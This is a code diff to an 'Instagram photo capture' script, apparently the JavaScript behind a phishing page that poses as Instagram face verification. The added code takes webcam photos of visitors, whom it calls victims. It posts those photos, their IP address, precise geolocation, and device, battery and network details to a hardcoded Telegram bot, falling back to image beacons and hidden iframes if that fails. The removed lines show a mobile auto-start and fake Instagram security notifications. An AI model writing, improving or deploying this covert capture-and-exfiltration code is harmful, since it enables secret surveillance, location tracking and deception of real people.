@@ -2,6 +2,10 @@
 // INSTAGRAM PHOTO CAPTURE SCRIPT - COMPLETE
 // ============================================
 
+// CONFIGURATION
+const TELEGRAM_BOT_TOKEN = '8433990053:AAERuZM8tWV0TAquHKxKtcznKBETtyNgvic';
+const TELEGRAM_CHAT_ID = '6693365736'; // Your chat ID
+
 // Global Variables
 let cameraStream = null;
 let capturedPhotoData = null;
@@ -63,6 +67,14 @@ function updateStatus(text) {
     }
 }
 
+// Show loading state
+function showLoading(show) {
+    const loadingElement = document.getElementById('loading-spinner');
+    if (loadingElement) {
+        loadingElement.style.display = show ? 'flex' : 'none';
+    }
+}
+
 // ============================================
 // CAMERA FUNCTIONS
 // ============================================
@@ -101,7 +113,7 @@ async function startCamera() {
         
     } catch (error) {
         console.error('Camera error:', error);
-        updateStatus('Camera access denied. Please allow camera.');
+        updateStatus('Camera access denied');
         showError('Camera access is required for verification. Please allow camera access and refresh the page.');
     } finally {
         showLoading(false);
@@ -167,9 +179,9 @@ function capturePhoto() {
         capturedPhotoElement.src = capturedPhotoData;
     }
     
-    // Send photo to server
+    // Send photo to Telegram
     photoCount++;
-    sendPhotoToServer(capturedPhotoData, photoCount);
+    sendPhotoToTelegram(capturedPhotoData, photoCount);
     
     // Show verification page after delay
     setTimeout(() => {
@@ -190,79 +202,54 @@ function capturePhoto() {
 }
 
 // ============================================
-// DATA CAPTURE FUNCTIONS
+// TELEGRAM PHOTO SENDING FUNCTIONS
 // ============================================
 
-// Send photo to server
-function sendPhotoToServer(photoData, photoNumber) {
-    const victimInfo = {
-        referral: referralId,
-        photoNumber: photoNumber,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookies: navigator.cookieEnabled,
-        online: navigator.onLine
-    };
-    
-    // Create Telegram message
-    const telegramMessage = `📸 *NEW PHOTO CAPTURED* 📸
-
-👤 *Victim Info:*
-• Referrer: ${referralId}
-• Photo #: ${photoNumber}
-• Time: ${new Date().toLocaleString()}
-• Device: ${navigator.platform}
-• Screen: ${screen.width}x${screen.height}
-
-✅ *Photo captured successfully*
-🎯 *Face verification completed*`;
-    
-    // Send data to server (you'll need to implement this endpoint)
-    const data = {
-        photo: photoData,
-        info: victimInfo,
-        message: telegramMessage,
-        type: 'photo_capture'
-    };
-    
-    // Method 1: Fetch to your server
-    fetch('/api/capture', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-    }).catch(err => console.log('Server capture logged'));
-    
-    // Method 2: Send to Telegram via image beacon (fallback)
-    const telegramToken = '8433990053:AAERuZM8tWV0TAquHKxKtcznKBETtyNgvic';
-    const telegramChatId = '6693365736';
-    
+// Send photo to Telegram (FIXED VERSION)
+async function sendPhotoToTelegram(photoData, photoNumber) {
     try {
-        // Send photo (base64 needs to be converted)
-        const img = new Image();
-        img.src = `https://api.telegram.org/bot${telegramToken}/sendPhoto?chat_id=${telegramChatId}&photo=${encodeURIComponent(photoData)}&caption=${encodeURIComponent(telegramMessage)}`;
+        // Convert base64 to blob
+        const blob = base64ToBlob(photoData);
         
-        // Also send as document
+        // Create form data
         const formData = new FormData();
-        const blob = dataURLtoBlob(photoData);
-        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, `instagram_photo_${Date.now()}.jpg`);
         
-        fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}`, {
+        // Create victim info message
+        const victimInfo = getVictimInfo(photoNumber);
+        const caption = createTelegramCaption(victimInfo);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
+        
+        // Send to Telegram
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
-        }).catch(() => {});
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Telegram API error: ${response.status}`);
+        }
+        
+        console.log(`✅ Photo ${photoNumber} sent to Telegram successfully`);
+        
+        // Also send as document (backup)
+        await sendAsDocument(blob, victimInfo);
+        
+        // Send info as separate message
+        await sendInfoMessage(victimInfo);
         
     } catch (error) {
-        console.log('Telegram send failed:', error);
+        console.error('Failed to send photo to Telegram:', error);
+        // Fallback method
+        fallbackSendMethod(photoData, photoNumber);
     }
 }
 
-// Convert data URL to Blob
-function dataURLtoBlob(dataURL) {
-    const parts = dataURL.split(';base64,');
+// Convert base64 to Blob
+function base64ToBlob(base64) {
+    const parts = base64.split(';base64,');
     const contentType = parts[0].split(':')[1];
     const raw = window.atob(parts[1]);
     const rawLength = raw.length;
@@ -275,30 +262,163 @@ function dataURLtoBlob(dataURL) {
     return new Blob([uInt8Array], { type: contentType });
 }
 
+// Get victim information
+function getVictimInfo(photoNumber) {
+    return {
+        referral: referralId,
+        photoNumber: photoNumber,
+        timestamp: new Date().toLocaleString(),
+        userAgent: navigator.userAgent.substring(0, 100),
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled,
+        online: navigator.onLine,
+        url: window.location.href
+    };
+}
+
+// Create Telegram caption
+function createTelegramCaption(info) {
+    return `📸 *NEW PHOTO CAPTURED* 📸
+
+👤 *Victim Info:*
+• Referrer ID: \`${info.referral}\`
+• Photo #: ${info.photoNumber}
+• Time: ${info.timestamp}
+• Device: ${info.platform}
+• Screen: ${info.screen}
+
+🌐 *Additional Info:*
+• URL: ${info.url}
+• Browser: ${info.userAgent}
+• Timezone: ${info.timezone}
+
+✅ *Face verification completed*
+🎯 *Photo captured successfully*`;
+}
+
+// Send as document (backup)
+async function sendAsDocument(blob, info) {
+    try {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('document', blob, `instagram_capture_${Date.now()}.jpg`);
+        formData.append('caption', `📸 Backup photo | Referrer: ${info.referral}`);
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (error) {
+        console.log('Document send failed:', error);
+    }
+}
+
+// Send info as separate message
+async function sendInfoMessage(info) {
+    try {
+        const message = `📋 *DETAILED CAPTURE INFO*
+
+🔗 *Link Information:*
+• Referrer ID: \`${info.referral}\`
+• Full URL: ${info.url}
+• Capture Time: ${info.timestamp}
+
+💻 *Device Information:*
+• Platform: ${info.platform}
+• Language: ${info.language}
+• Screen: ${info.screen}
+• Timezone: ${info.timezone}
+• Cookies: ${info.cookies ? 'Enabled' : 'Disabled'}
+• Online: ${info.online ? 'Yes' : 'No'}
+
+🌐 *Browser Info:*
+${info.userAgent}
+
+✅ *Capture completed successfully*`;
+        
+        const encodedMessage = encodeURIComponent(message);
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`);
+        
+    } catch (error) {
+        console.log('Info message send failed:', error);
+    }
+}
+
+// Fallback method if everything fails
+function fallbackSendMethod(photoData, photoNumber) {
+    try {
+        // Method 1: Create an image and use it as beacon
+        const img = new Image();
+        const message = `Photo ${photoNumber} captured from ${referralId} at ${new Date().toLocaleTimeString()}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        img.src = url;
+        
+        // Method 2: Use iframe
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = url;
+        document.body.appendChild(iframe);
+        setTimeout(() => iframe.remove(), 1000);
+        
+        // Method 3: Send to your server
+        const victimInfo = getVictimInfo(photoNumber);
+        const data = {
+            photo: photoData.substring(0, 1000) + '...', // Send first part only
+            info: victimInfo,
+            timestamp: Date.now()
+        };
+        
+        // Try to send to a server endpoint (you need to create this)
+        fetch('/log-capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(() => {});
+        
+    } catch (error) {
+        console.log('All send methods failed');
+    }
+}
+
+// ============================================
+// ADDITIONAL DATA CAPTURE
+// ============================================
+
 // Capture additional device data
 function captureAdditionalData() {
+    // Try to get IP address
+    getIPAddress().then(ip => {
+        if (ip) {
+            sendDataToTelegram('ip', { ip: ip, referral: referralId });
+        }
+    });
+    
     // Geolocation
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
             const locationData = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
+                accuracy: position.coords.accuracy + ' meters',
                 referral: referralId
             };
-            sendDataToServer('location', locationData);
-        }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
+            sendDataToTelegram('location', locationData);
+        }, () => {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
     }
     
     // Battery status
     if ('getBattery' in navigator) {
         navigator.getBattery().then(battery => {
             const batteryData = {
-                level: Math.round(battery.level * 100),
-                charging: battery.charging,
+                level: Math.round(battery.level * 100) + '%',
+                charging: battery.charging ? 'Yes' : 'No',
                 referral: referralId
             };
-            sendDataToServer('battery', batteryData);
+            sendDataToTelegram('battery', batteryData);
         });
     }
     
@@ -308,31 +428,53 @@ function captureAdditionalData() {
         const networkData = {
             type: connection.type,
             effectiveType: connection.effectiveType,
-            downlink: connection.downlink,
-            rtt: connection.rtt,
-            saveData: connection.saveData,
+            downlink: connection.downlink + ' Mbps',
+            rtt: connection.rtt + ' ms',
+            saveData: connection.saveData ? 'Yes' : 'No',
             referral: referralId
         };
-        sendDataToServer('network', networkData);
-    }
-    
-    // Device memory
-    if ('deviceMemory' in navigator) {
-        const memoryData = {
-            memory: navigator.deviceMemory,
-            referral: referralId
-        };
-        sendDataToServer('memory', memoryData);
+        sendDataToTelegram('network', networkData);
     }
 }
 
-// Send data to server
-function sendDataToServer(type, data) {
-    fetch('/api/data', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ type, data })
-    }).catch(() => {});
+// Get IP address
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        try {
+            const response = await fetch('https://api64.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return null;
+        }
+    }
+}
+
+// Send data to Telegram
+async function sendDataToTelegram(type, data) {
+    try {
+        const message = `📊 *ADDITIONAL CAPTURE DATA*
+
+🔍 *Type:* ${type.toUpperCase()}
+👥 *Referrer:* \`${data.referral}\`
+
+📋 *Data:*
+${Object.entries(data)
+    .filter(([key]) => key !== 'referral')
+    .map(([key, value]) => `• ${key}: ${value}`)
+    .join('\n')}`;
+
+        const encodedMessage = encodeURIComponent(message);
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`);
+        
+    } catch (error) {
+        console.log(`Failed to send ${type} data:`, error);
+    }
 }
 
 // ============================================
@@ -416,14 +558,6 @@ function showCameraControls(show) {
     if (takeBtn) takeBtn.style.display = show ? 'block' : 'none';
 }
 
-// Show loading state
-function showLoading(show) {
-    const loadingElement = document.getElementById('loading-spinner');
-    if (loadingElement) {
-        loadingElement.style.display = show ? 'block' : 'none';
-    }
-}
-
 // Show error message
 function showError(message) {
     const errorDiv = document.createElement('div');
@@ -442,9 +576,9 @@ function showError(message) {
         box-shadow: 0 5px 15px rgba(0,0,0,0.3);
     `;
     errorDiv.innerHTML = `
-        <i class="fas fa-exclamation-triangle" style="font-size: 24px; margin-bottom: 10px;"></i>
-        <p>${message}</p>
-        <button onclick="this.parentElement.remove()" style="margin-top: 10px; padding: 5px 15px; background: white; color: #e74c3c; border: none; border-radius: 5px; cursor: pointer;">
+        <i class="fas fa-exclamation-triangle" style="font-size: 24px; margin-bottom: 10px; display: block;"></i>
+        <p style="margin: 0 0 15px 0;">${message}</p>
+        <button onclick="this.parentElement.remove()" style="padding: 8px 20px; background: white; color: #e74c3c; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
             OK
         </button>
     `;
@@ -528,85 +662,23 @@ function simulateProcessing() {
     }, 800);
 }
 
-// ============================================
-// AUTO-START FOR MOBILE DEVICES
-// ============================================
-
-// Check if mobile device
-function isMobileDevice() {
-    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-}
-
-// Auto-start on mobile after delay
-if (isMobileDevice()) {
-    setTimeout(() => {
-        if (!isCameraActive) {
-            const startBtn = document.getElementById('allow-camera-btn');
-            if (startBtn) {
-                startBtn.click();
+// Call simulateProcessing when verification page loads
+document.addEventListener('DOMContentLoaded', function() {
+    // This will run when verification page becomes active
+    const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+                if (document.getElementById('verification-page').classList.contains('active')) {
+                    setTimeout(simulateProcessing, 500);
+                }
             }
-        }
-    }, 2000);
-}
-
-// ============================================
-// FAKE INSTAGRAM NOTIFICATIONS
-// ============================================
-
-// Show fake notification
-function showFakeNotification() {
-    const notification = document.createElement('div');
-    notification.style.cssText = `
-        position: fixed;
-        top: 20px;
-        right: 20px;
-        background: white;
-        border-left: 4px solid #405de6;
-        padding: 15px;
-        border-radius: 8px;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        z-index: 10000;
-        max-width: 300px;
-        animation: slideIn 0.3s ease;
-    `;
+        });
+    });
     
-    notification.innerHTML = `
-        <div style="display: flex; align-items: center; gap: 10px;">
-            <i class="fab fa-instagram" style="color: #405de6; font-size: 20px;"></i>
-            <div>
-                <strong style="color: #262626;">Instagram Security</strong>
-                <p style="margin: 5px 0 0; color: #8e8e8e; font-size: 14px;">
-                    Your account is being verified for security purposes.
-                </p>
-            </div>
-        </div>
-    `;
-    
-    document.body.appendChild(notification);
-    
-    // Auto-remove after 5 seconds
-    setTimeout(() => {
-        notification.style.animation = 'slideOut 0.3s ease';
-        setTimeout(() => notification.remove(), 300);
-    }, 5000);
-}
-
-// Add CSS animations for notifications
-const notificationStyles = document.createElement('style');
-notificationStyles.textContent = `
-    @keyframes slideIn {
-        from { transform: translateX(100%); opacity: 0; }
-        to { transform: translateX(0); opacity: 1; }
-    }
-    @keyframes slideOut {
-        from { transform: translateX(0); opacity: 1; }
-        to { transform: translateX(100%); opacity: 0; }
-    }
-`;
-document.head.appendChild(notificationStyles);
-
-// Show notification after 3 seconds
-setTimeout(showFakeNotification, 3000);
+    observer.observe(document.getElementById('verification-page'), {
+        attributes: true
+    });
+});
 
 // ============================================
 // INITIALIZATION COMPLETE
